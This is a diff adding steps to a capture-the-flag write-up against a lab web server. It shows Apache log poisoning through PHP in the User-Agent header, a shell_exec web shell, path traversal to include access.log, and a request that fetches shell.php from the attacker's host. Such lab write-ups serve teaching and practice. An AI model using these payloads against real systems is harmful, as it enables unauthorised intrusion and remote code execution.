@@ -2,7 +2,8 @@
 
 Starting off with some recon:
 ```sh
-nmap -sC -sV 10.10.219.26
+kali@kali nmap -sC -sV 10.10.219.26
+
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 09:50 CEST
 Nmap scan report for 10.10.219.26
 Host is up (0.078s latency).
@@ -125,4 +126,66 @@ After poking around a bit I also found the file `/var/log/apache2/access.log`. <
 ![grafik](https://github.com/Aryt3/writeups/assets/110562298/44f84c81-be23-492c-9630-e99f08b17379)
 
 Looking at the access logs we can see that the user agent is logged additionally without being URL encoded. <br/>
-Now this may be used to upload malicious content.
+Now this may be used to upload malicious content. <br/>
+
+Testing with the following request: <br/>
+```sh
+GET / HTTP/1.1
+Host: 10.10.198.107
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php echo phpinfo()?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+Viewing the logs: <br/>
+![grafik](https://github.com/Aryt3/writeups/assets/110562298/1339543d-0012-46db-8316-d8cf527820d0)
+
+After knowing that it works I sent another request to implement a way t oexecute commands. <br/>
+```sh
+GET / HTTP/1.1
+Host: 10.10.27.254
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php echo shell_exec($_GET['cmd']) ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+After executing the request I used the following url to list the contents of the working directory: <br/>
+```sh
+http://10.10.27.254/?view=dog/../../../../var/log/apache2/access.log&cmd=ls&ext=
+```
+
+This let's us see the following: <br/>
+```
+10.18.20.25 - - [27/Oct/2023:10:41:30 +0000] "GET / HTTP/1.1" 200 500 "-" "cat.php cats dog.php dogs flag.php index.php style.css
+```
+
+This doesn't get us far so sending the following request I tried to send over a php reverse shell. <br/>
+```sh
+GET / HTTP/1.1
+Host: 10.10.27.254
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php echo file_get_contents('http://10.18.20.25/shell.php'); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+Looking at my http server: <br/>
+```sh
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.27.254 - - [27/Oct/2023 12:51:21] "GET / HTTP/1.0" 200 -
+10.10.27.254 - - [27/Oct/2023 12:51:21] "GET /shell.php HTTP/1.0" 200 -
+```
+
+
+
+
+
